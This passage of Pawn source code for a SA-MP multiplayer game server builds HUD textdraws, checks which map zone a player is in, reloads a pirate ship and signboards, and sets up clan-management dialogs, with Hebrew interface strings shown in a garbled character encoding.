		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][10],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][10],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][10],0.279998,1.499999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][10],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][10],1);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][10],1);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][10],380.000000,14.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][10],1);
		playerinfo[playerid][border][11] = CreatePlayerTextDraw(playerid,377.000000,345.000000,".");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][11],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][11],3);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][11],0.159998,12.800003);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][11],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][11],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][11],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][11],0);
		playerinfo[playerid][border][12] = CreatePlayerTextDraw(playerid,398.000000,430.000000,"Friends (0)");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][12],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][12],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][12],0.279998,1.499999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][12],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][12],1);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][12],1);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][12],460.000000,14.000000); // 460
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][12],1);
		playerinfo[playerid][border][13] = CreatePlayerTextDraw(playerid,461.000000,345.000000,".");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][13],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][13],3);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][13],0.159998,12.800003);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][13],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][13],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][13],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][13],0);
		playerinfo[playerid][border][14] = CreatePlayerTextDraw(playerid,109.000000,431.000000,"hud:radar_ammugun");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][14],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][14],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][14],0.500000,1.000000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][14],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][14],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][14],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][14],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][14],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][14],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][14],14.000000,14.000000);
		playerinfo[playerid][border][15] = CreatePlayerTextDraw(playerid,177.000000,431.000000,"hud:radar_cash");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][15],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][15],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][15],0.500000,1.000000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][15],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][15],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][15],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][15],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][15],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][15],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][15],14.000000,14.000000);
		playerinfo[playerid][border][16] = CreatePlayerTextDraw(playerid,257.000000,431.000000,"ld_grav:timer");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][16],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][16],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][16],0.500000,1.000000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][16],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][16],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][16],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][16],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][16],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][16],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][16],14.000000,14.000000);
		playerinfo[playerid][border][17] = CreatePlayerTextDraw(playerid,381.000000,431.000000,"hud:radar_gangG");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][17],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][17],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][17],0.500000,1.000000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][17],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][17],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][17],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][17],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][17],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][17],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][17],14.000000,14.000000);
		playerinfo[playerid][border][18] = CreatePlayerTextDraw(playerid,624.000000,431.000000,"hud:radar_propertyG");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][18],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][18],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][18],0.500000,1.000000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][18],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][18],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][18],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][18],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][18],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][18],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][18],14.000000,14.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][18],1);
		playerinfo[playerid][border][19] = CreatePlayerTextDraw(playerid,33.000000,338.000000,"ld_beat:cring");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][19],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][19],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][19],-0.489998,0.099999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][19],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][19],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][19],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][19],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][19],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][19],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][19],108.000000,88.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][19],1);
		playerinfo[playerid][border][20] = CreatePlayerTextDraw(playerid,609.000000,431.000000,"hud:radar_impound");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][20],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][20],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][20],0.500000,5.399999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][20],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][20],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][20],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][20],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][20],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][20],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][20],14.000000,14.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][20],1);
		playerinfo[playerid][border][21] = CreatePlayerTextDraw(playerid,146.000000,362.000000,"hud:radar_qmark");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][21],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][21],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][21],0.500000,2.000000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][21],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][21],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][21],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][21],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][21],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][21],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][21],34.000000,41.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][21],1);
		playerinfo[playerid][border][22] = CreatePlayerTextDraw(playerid,189.000000,361.000000,"hud:fist");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][22],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][22],4);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][22],0.500000,5.399999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][22],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][22],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][22],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][22],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][22],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][22],255);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][22],47.000000,47.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][22],1);
		playerinfo[playerid][border][23] = CreatePlayerTextDraw(playerid,202.000000,380.000000,"Play");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][23],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][23],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][23],0.300000,1.299999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][23],-1800218881);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][23],1);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][23],1);
	}
	else if(equal(act,"update"))
	{
		new datetime[6];
		getdate(datetime[0],datetime[1],datetime[2]);
		gettime(datetime[3],datetime[4],datetime[5]);
		PlayerTextDrawSetString(playerid,playerinfo[playerid][border][5],GetName(playerid));
		format(string,sizeof(string),"Level: %02d",playerinfo[playerid][level]);
		PlayerTextDrawSetString(playerid,playerinfo[playerid][border][6],string);
		format(string,sizeof(string),"%08d",playerinfo[playerid][bank]);
		PlayerTextDrawSetString(playerid,playerinfo[playerid][border][8],string);
		format(string,sizeof(string),"%02d/%02d/%04d %02d:%02d",datetime[2],datetime[1],datetime[0],datetime[3],datetime[4]);
		PlayerTextDrawSetString(playerid,playerinfo[playerid][border][10],string);
	}
	else if(equal(act,"updatefriends"))
	{
		new list[MAX_FRIENDS], c = 0;
		list = GetFriends(playerid,c);
		format(string,sizeof(string),"Friends (%d)",c);
		PlayerTextDrawSetString(playerid,playerinfo[playerid][border][12],string);
	}
	else if(equal(act,"color"))
	{
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][0],setAlpha(col,BorderAlpha(playerid,0)));
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][1],setAlpha(col,BorderAlpha(playerid,1)));
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][2],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][4],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][7],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][9],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][11],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][13],setAlpha(col,BorderAlpha(playerid,2)));
		if(playerinfo[playerid][bordervis])
		{
			new ids[] = {0,1,2,4,7,9,11,13};
			for(new i = 0; i < sizeof(ids); i++) if(playerinfo[playerid][border][ids[i]] != INVALID_PLAYER_TEXT_DRAW)
			{
				PlayerTextDrawHide(playerid,playerinfo[playerid][border][ids[i]]);
				PlayerTextDrawShow(playerid,playerinfo[playerid][border][ids[i]]);
			}
		}
	}
	else if(equal(act,"hidden"))
	{
		if(playerinfo[playerid][bordervis])
		{
			if(playerinfo[playerid][vehicle][0] > 0) PlayerTextDrawShow(playerid,playerinfo[playerid][border][20]);
			else PlayerTextDrawHide(playerid,playerinfo[playerid][border][20]);
		}
	}
	else if(equal(act,"show"))
	{
		for(new i = 0; i <= 17; i++) if(playerinfo[playerid][border][i] != INVALID_PLAYER_TEXT_DRAW) PlayerTextDrawShow(playerid,playerinfo[playerid][border][i]);
		if(playerinfo[playerid][vehicle][0] > 0) PlayerTextDrawShow(playerid,playerinfo[playerid][border][20]);
		playerinfo[playerid][bordervis] = 1;
	}
	else if(equal(act,"hide"))
	{
		for(new i = 0; i <= 17; i++) if(playerinfo[playerid][border][i] != INVALID_PLAYER_TEXT_DRAW) PlayerTextDrawHide(playerid,playerinfo[playerid][border][i]);
		PlayerTextDrawHide(playerid,playerinfo[playerid][border][18]);
		PlayerTextDrawHide(playerid,playerinfo[playerid][border][20]);
		playerinfo[playerid][bordervis] = 0;
	}
	else if(equal(act,"delete"))
	{
		for(new i = 0; i < 24; i++) if(playerinfo[playerid][border][i] != INVALID_PLAYER_TEXT_DRAW)
		{
			PlayerTextDrawHide(playerid,playerinfo[playerid][border][i]);
			PlayerTextDrawDestroy(playerid,playerinfo[playerid][border][i]);
			playerinfo[playerid][border][i] = INVALID_PLAYER_TEXT_DRAW;
		}
	}
	else if(equal(act,"eselect"))
	{
		PlayerTextDrawShow(playerid,playerinfo[playerid][border][19]);
		PlayerTextDrawShow(playerid,playerinfo[playerid][border][21]);
		PlayerTextDrawShow(playerid,playerinfo[playerid][border][22]);
		PlayerTextDrawShow(playerid,playerinfo[playerid][border][23]);
		SelectTextDraw(playerid,grey);
		playerinfo[playerid][editingborder] = 1;
	}
	else if(equal(act,"dselect"))
	{
		PlayerTextDrawHide(playerid,playerinfo[playerid][border][19]);
		PlayerTextDrawHide(playerid,playerinfo[playerid][border][21]);
		PlayerTextDrawHide(playerid,playerinfo[playerid][border][22]);
		PlayerTextDrawHide(playerid,playerinfo[playerid][border][23]);
		if(playerinfo[playerid][showingtxd][txd_map]) ShowTXD(playerid,txd_map,'h');
		CancelSelectTextDraw(playerid);
		playerinfo[playerid][editingborder] = 0;
	}
}
//=[ZoneID]=====================================================================
stock ZoneID(name[])
{
	new str[64];
	format(str,sizeof(str),"Zone_%s",name);
	return PropertyExists_INT(str) ? GetProperty_INT(str) : -1;
}
//=[GetPlayerZones]=============================================================
stock GetPlayerZone(playerid,primary=0)
{
	new startFrom = primary ? ZoneID("Los Santos") : 0, endIn = primary ? sizeof(Zones) : ZoneID("Los Santos"), Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	for(new i = startFrom; i < endIn; i++)
	{
		if(p[0] >= Zones[i][zone_minx] && p[0] <= Zones[i][zone_maxx] &&
		p[1] >= Zones[i][zone_miny] && p[1] <= Zones[i][zone_maxy] &&
		p[2] >= Zones[i][zone_minz] && p[2] <= Zones[i][zone_maxz]) return i;
	}
	return -1;
}
//=[IsPlayerInZone]=============================================================
stock IsPlayerInZone(playerid,i)
{
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	return p[0] >= Zones[i][zone_minx] && p[0] <= Zones[i][zone_maxx] &&
	p[1] >= Zones[i][zone_miny] && p[1] <= Zones[i][zone_maxy] &&
	p[2] >= Zones[i][zone_minz] && p[2] <= Zones[i][zone_maxz];
}
//=[TakeAmmuItemAmmo]===========================================================
stock TakeAmmuItemAmmo(playerid,item,requireupdate = 0)
{
	if(playerinfo[playerid][ammuitems][item])
	{
		playerinfo[playerid][ammuitemammo][item]--;
		if(playerinfo[playerid][ammuitemammo][item] <= 0)
		{
			new string[M_S];
			if(playerinfo[playerid][logged] && requireupdate)
			{
				format(string,sizeof(string),"AmmuItem%d",AmmunationSpecialItems[item][aiID]);
				fsetint(fuser(playerid),string,0);
			}
			playerinfo[playerid][ammuitems][item] = false;
			format(string,sizeof(string),@c(red) " .Ётю°х ьъ фЇЄющэ ь∙щюх∙ с·хёє \"%s\"! рэ р·ф °хЎф рх·х Єьщъ ьўЁх· рх·х ∙хс",AmmunationSpecialItems[item][aiName]);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "·хёЇщ чЁх· фЁ∙ўщэ",string,"ётх°","");
		}
	}
}
//=[clancode]===================================================================
stock clancode(id)
{
	new string[32];
	format(string,sizeof(string),"%s/%d",claninfo[id][cname],id);
	return string;
}
//=[ReloadPirateShip]===========================================================
stock ReloadPirateShip()
{
	if(pirateObjects > 0) for(new i = 0; i < pirateObjects; i++) if(IsValidSObject(pirateObject[i]))
	{
		DestroySObject(pirateObject[i]);
		pirateObject[i] = -1;
	}
	pirateObjects = 0;
	UpdateMoneyAreaPosition(0,0);
	if(pirateUser[0] != INVALID_PLAYER_ID)
	{
		new tmp = pirateUser[0];
		pirateUser[0] = INVALID_PLAYER_ID, pirateUser[1] = 0;
		SetPlayerPos(tmp,2000.5524,1538.2231,16.5859);
		News(" /Sail !ёЇщЁ· фыёє ЇЁхщф ыЄ· ь∙щщш");
	}
	SetVehicleVirtualWorld(pirateVehicle,world_pirateship);
	SetVehiclePos(pirateVehicle,1996.1755,1545.2629,-200.3312);
	if(IsValidSObject(pirateshipobj)) DestroySObject(pirateshipobj);
	pirateshipobj = CreateSObject(8493, 2001.14063, 1555.10156, 24.87500,   360.03839, 0.00000, 0.02160);
	pirateObject[pirateObjects++] = CreateSObject(8981, 2000.59375, 1548.91406, 24.43750,   360.21841, 0.00000, 0.04160);
	pirateObject[pirateObjects++] = CreateSObject(9159, 2001.14063, 1555.10156, 24.87500,   359.97839, 0.00000, 0.00160);
	pirateObject[pirateObjects++] = CreateSObject(1503, 1998.00781, 1544.19531, 12.96090,   0.14160, 0.00000, 90.50000);
	pirateObject[pirateObjects++] = CreateSObject(3524, 2005.23438, 1549.67188, 13.72660,   0.00000, 0.00000, 90.00000);
	pirateObject[pirateObjects++] = CreateSObject(3524, 2005.43750, 1539.84375, 13.72660,   0.00000, 0.00000, 90.00000);
	pirateObject[pirateObjects++] = CreateSObject(3524, 1996.04688, 1549.74219, 13.72660,   0.00000, 0.00000, 270.00000);
	pirateObject[pirateObjects++] = CreateSObject(3524, 1995.82031, 1539.78125, 13.72660,   0.00000, 0.00000, 270.00000);
	return 1;
}
//=[CreatePShipObject]==========================================================
stock CreatePShipObject(objectid,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz)
{
	pirateObject[pirateObjects] = CreateObject(objectid,x,y,z,rx,ry,rz,object_show_distance);
	pirateObjectPos[pirateObjects][0] = x;
	pirateObjectPos[pirateObjects][1] = y;
	pirateObjectPos[pirateObjects][2] = z;
	pirateObjectPos[pirateObjects][3] = rx;
	pirateObjectPos[pirateObjects][4] = ry;
	pirateObjectPos[pirateObjects][5] = rz;
	pirateObjects++;
	return pirateObject[pirateObjects-1];
}
//=[ReloadSignboards]===========================================================
stock ReloadSignboards()
{
	new key[64], params[5];
	for(new i = 0; i < sizeof(Signboards); i++)
	{
		if(Signboards[i][sbObject] != -1)
		{
			DestroySObject(Signboards[i][sbObject]);
			Signboards[i][sbObject] = -1;
		}
		if(fkeyexist(file_signboards,Signboards[i][sbKey]))
		{
			format(key,sizeof(key),"%sFontSize",Signboards[i][sbKey]);
			params[0] = fgetint(file_signboards,key);
			format(key,sizeof(key),"%sFontBold",Signboards[i][sbKey]);
			params[1] = fgetint(file_signboards,key);
			format(key,sizeof(key),"%sFontColor",Signboards[i][sbKey]);
			params[2] = fgetint(file_signboards,key);
			format(key,sizeof(key),"%sBGColor",Signboards[i][sbKey]);
			params[3] = fgetint(file_signboards,key);
			format(key,sizeof(key),"%sAlign",Signboards[i][sbKey]);
			params[4] = fgetint(file_signboards,key);
			format(key,sizeof(key),"%sFontName",Signboards[i][sbKey]);
			Signboards[i][sbObject] = CreateSObject(Signboards[i][sbModelID],Signboards[i][sbCoords][0],Signboards[i][sbCoords][1],Signboards[i][sbCoords][2],Signboards[i][sbCoords][3],Signboards[i][sbCoords][4],Signboards[i][sbCoords][5]);
			SetDynamicObjectMaterialText(Signboards[i][sbObject],0,strreplace(fgetstring(file_signboards,Signboards[i][sbKey]),"\\n","\n"),Signboards[i][sbSize],fgetstring(file_signboards,key),params[0],params[1],params[2],params[3],params[4]);
		}
	}
}
//=[SetSignboardText]===========================================================
stock SetSignboardText(i,text[])
{
	if(Signboards[i][sbObject] != -1)
	{
		new key[64], params[5];
		format(key,sizeof(key),"%sFontSize",Signboards[i][sbKey]);
		params[0] = fgetint(file_signboards,key);
		format(key,sizeof(key),"%sFontBold",Signboards[i][sbKey]);
		params[1] = fgetint(file_signboards,key);
		format(key,sizeof(key),"%sFontColor",Signboards[i][sbKey]);
		params[2] = fgetint(file_signboards,key);
		format(key,sizeof(key),"%sBGColor",Signboards[i][sbKey]);
		params[3] = fgetint(file_signboards,key);
		format(key,sizeof(key),"%sAlign",Signboards[i][sbKey]);
		params[4] = fgetint(file_signboards,key);
		format(key,sizeof(key),"%sFontName",Signboards[i][sbKey]);
		SetDynamicObjectMaterialText(Signboards[i][sbObject],0,text,Signboards[i][sbSize],fgetstring(file_signboards,key),params[0],params[1],params[2],params[3],params[4]);
	}
	return 1;
}
//=[RGBAFromString]=============================================================
stock RGBAFromString(string[],argb = 0)
{
	new idx, str[64], rgba[4];
	for(new i = 0; i < 4; i++) str = strtok(string,idx,','), rgba[i] = strval(str);
	return argb ? RGBAToABGR(rgba2hex(rgba[0],rgba[1],rgba[2],rgba[3])) : rgba2hex(rgba[0],rgba[1],rgba[2],rgba[3]);
}
//=[RGBAToABGR]=================================================================
stock RGBAToABGR(C) return ((C  & 0xFF) & 0xFF) | (((C >>> 8 & 0xFF) & 0xFF) << 8) | (((C >>> 16 & 0xFF) & 0xFF) << 16) | ((C >>> 24) << 24); // by Y_Less, improved by me
//=[UpdateSignboards]===========================================================
stock UpdateSignboards(updatetype[])
{
	new string[M_S];
	if(equal(updatetype,"clans"))
	{
		new openClan[MAX_CLANS] = {-1,...}, openClans = 0;
		for(new i = 0; i < MAX_CLANS; i++) if(claninfo[i][ctest]) openClan[openClans++] = i;
		if(openClans <= 3) string = "- ьр цющя -";
		else
		{
			new rnd[3] = {-1,...};
			rnd[0] = random(openClans);
			do rnd[1] = random(openClans);
			while rnd[1] == rnd[0];
			do rnd[2] = random(openClans);
			while rnd[2] == rnd[0] || rnd[2] == rnd[1];
			format(string,sizeof(string),"%s Х %s Х %s",claninfo[openClan[rnd[0]]][cname],claninfo[openClan[rnd[1]]][cname],claninfo[openClan[rnd[2]]][cname]);
		}
		format(string,sizeof(string),":ўьрЁщэ Ї·хчщэ ьшёшщэ\n%s\n\n{0000FF}(/Clans ь°∙щюф фюьрф)",string);
		for(new i = 0; i < sizeof(Signboards); i++) if(Signboards[i][sbUpdateType] == sbu_clans) SetSignboardText(i,string);
	}
}
//=[sadd]=======================================================================
stock sadd(string[],const addition[],bool:newline = true,maxlength = sizeof string)
{
	format(string,maxlength,newline ? (!strlen(string) ? ("%s\n%s") : ("%s%s")) : ("%s%s"),string,addition);
	return string;
}
//=[ClanDialog]=================================================================
stock ClanDialog(playerid,id,param[]="",paramint=0)
{
	if(id == clan_none) return 1;
	#define sadd(%1,%2) format(%1,sizeof(%1),!strlen(%1) ? ("%s%s") : ("%s\n%s"),%1,%2)
	new _head[64], _style = -1, _text[M_S_D], _b1[16], _b2[16], _parent = clan_none, string[128], bool:colorChoosing = false, f[64];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
	switch(id)
	{
		case clan_main:
		{
			_head = "Єюху °р∙щ", _style = DIALOG_STYLE_LIST, _b1 = "рщ∙х°", _b2 = "ётх°", _parent = clan_none;
			sadd(_text,"ющуЄ юьр Єь фўьря");
			sadd(_text,"°∙щю· ф∙чўЁщэ фюьрф");
			sadd(_text,"°∙щю· ф∙чўЁщэ фючхс°щэ");
			sadd(_text,"Є°щы· Ї°шщ фюЇўуф");
			sadd(_text,"Ёщфхь фўьря");
			sadd(_text,"юЄ°ых·");
			sadd(_text,"Ёщфхь фЎ'рш");
			sadd(_text,"ыхчх· ющхчущэ");
			sadd(_text,"юЎьюх· рсшчф");
			sadd(_text,"ўЁщх·");
			sadd(_text,"с°щ·х·");
			sadd(_text,"ўьрЁщэ рч°щэ");
			sadd(_text,@c(red) "Ї°щ∙ф юфўьря");
			sadd(_text,@c(blue) "(?) юу°щъ ьюЄ°ы· фўьрЁщэ");
		}
		case clan_not:
		{
			_head = "ющуЄ", _style = DIALOG_STYLE_MSGBOX, _b1 = "ётх°", _b2 = "чцх°", _parent = paramint == 0 ? playerinfo[playerid][cclick][0] : paramint;
			format(_text,sizeof(_text),param);
		}
		case clan_err:
		{
			_head = "!∙тщрф", _style = DIALOG_STYLE_MSGBOX, _b1 = "ётх°", _b2 = "чцх°", _parent = paramint == 0 ? playerinfo[playerid][cclick][0] : paramint;
			format(_text,sizeof(_text),@c(red) "%s",param);
		}
		case clan_fullinfo:
		{
			//_head = "ющуЄ юьр Єь фўьря", _style = DIALOG_STYLE_, _b1 = "ющуЄ", _b2 = "чцх°", _parent = clan_main;
			//sadd(_text, "рЁр фыЁё р· ∙э фўьря ∙с°ЎхЁъ ь°рх· ющуЄ Єьщх");
			//ShowClanStats(playerid,playerinfo[playerid][clan],dialog_clan);
			new s[32];
			format(s,sizeof(s),"/cstats %s",claninfo[playerinfo[playerid][clan]][cname]);
			command(playerid, s);
			return 1;
		}
		case clan_allmembers:
		{
			_head = "°∙щю· ф∙чўЁщэ", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			new c = ClanPList_Count(playerinfo[playerid][clan]);
			format(_head,sizeof(_head),"(%d) %s",c,_head);
			sadd(_text,@c(yellow) "(+) фхёЇ· чс° чу∙ ьўьря");
			format(string,sizeof(string),@c(yellow) "(+) ёъ фыь %d ю·хъ %d чс°щэ",max_clan_members,c);
			sadd(_text,string);
			sadd(_text,"(+) ёщух° °∙щю· чс°щэ - ЎюЎхэ юўхюх· ЇЁхщщэ");
			for(new i = 1; i <= max_clan_members; i++)
			{
				format(string,sizeof(string),ClanPList_Player(playerinfo[playerid][clan],i));
				if(equal(string,"None")) format(string,sizeof(string),"- ЇЁхщ -");
				format(string,sizeof(string),"{%s}%s",HexStringOfColor(!((i-1) % 2) ? white : lightyellow),string);
				sadd(_text,string);
			}
		}
		case clan_onlinemembers:
		{
			_head = "∙чўЁщэ ючхс°щэ", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++)
			{
				format(string,sizeof(string),"{%s}[ID: %03d] %s",HexStringOfColor(!(i % 2) ? white : lightyellow),claninfo[playerinfo[playerid][clan]][cplayers][i],GetName(claninfo[playerinfo[playerid][clan]][cplayers][i]));
				sadd(_text,string);
			}
		}
		case clan_edit:
		{
			_head = "Є°щы· Ї°шщ фюЇўуф", _style = DIALOG_STYLE_LIST, _b1 = "Є°щыф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(grey) "∙щЁхщ ∙щтх° ьюЇўуф - °тщь");
			sadd(_text,@c(grey) "∙щЁхщ ∙щтх° ьюЇўуф - с°ыс");
			format(string,sizeof(string),@c(white) "%s" @c(grey) " :∙щЁхщ Їўхуф ь∙щтх°",claninfo[playerinfo[playerid][clan]][ccmd]);
			sadd(_text,string);
			format(string,sizeof(string),@c(grey) "ЁЄщь· сЁў фўьря: " @c(white) "%s",claninfo[playerinfo[playerid][clan]][clbank] ? ("ЁЄхь") : ("Ї·хч"));
			sadd(_text,string);
			sadd(_text,@c(grey) "∙щЁхщ фющўхэ ∙ь сЁў фўьря");
			sadd(_text,@c(grey) "фёшх°щщ· фсЁў");
			//format(string,sizeof(string),@c(grey) "тхуь рцх° фўьря сюЇф: " @c(white) "%d",claninfo[playerinfo[playerid][clan]][cgzonesize]);
			//sadd(_text,string);
